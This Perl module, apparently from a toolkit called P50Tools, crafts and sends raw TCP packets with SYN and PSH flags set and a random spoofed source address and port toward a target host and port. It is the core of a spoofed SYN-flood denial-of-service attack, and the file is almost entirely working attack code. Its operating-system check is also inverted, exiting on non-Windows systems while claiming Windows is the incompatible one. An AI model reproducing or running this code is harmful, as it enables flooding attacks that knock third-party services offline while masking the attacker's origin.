package P50Tools::Packs;

use common::sense;
use Net::RawIP;
use Packs::PacksSize;
use Packs::RandonIp;
use Moose;

if ($^O !~ m/MSW/gi) {
	print "you cannot use this\n";
	print "you can modified this package but you will need Net::RawIP, but this package require libcarp, and it's is incompatible with Windows\n"; 
	exit 0;
}

has 'target' => (is => 'rw', isa => 'Str');
has 'door' => (is => 'rw', isa => 'Str', default => 80);

sub send{
	my $self = shift;
	my $s1 = $self->target;
	my $s2 = $self->door;
	
	my $ip = P50Tools::Packs::RandonIp->new(); 
	my $size = P50Tools::Packs::PacksSize->new();
	say "___________________________";
    say "DADDR = $s1";
    say "SADDR = $ip";
    say "SOURCE = $size";
    say "DEST = $s2";
	say "___________________________";
	my $n = Net::RawIP->new({
		ip => {
			saddr => $ip,
			daddr => $s1,
		},
		tcp => {
			source => $size,
			dest => $s2,
			psh => 1,
			syn => 1,
		},
	});
	$n->send;
	return $n;
}
no Moose;
1;
